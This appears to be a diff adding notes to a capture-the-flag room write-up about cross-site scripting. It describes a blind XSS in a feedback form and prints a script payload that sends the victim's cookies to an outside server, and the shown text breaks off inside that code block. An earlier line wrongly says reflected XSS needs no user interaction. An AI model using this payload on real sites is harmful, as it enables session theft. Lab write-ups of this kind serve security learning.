@@ -22,3 +22,12 @@ This room simulates a web application with potential XSS vulnerabilities and enc
 ---
 
 🧠 *Reflected XSS requires no user interaction — prime target for session hijacking.*
+
+## Overview
+This room simulated a bug bounty scenario involving input sanitization failures.
+
+## Exploit
+Discovered a blind XSS vulnerability in a feedback form:
+
+```html
+<script>new Image().src="http://myserver.com?cookie="+document.cookie</script>
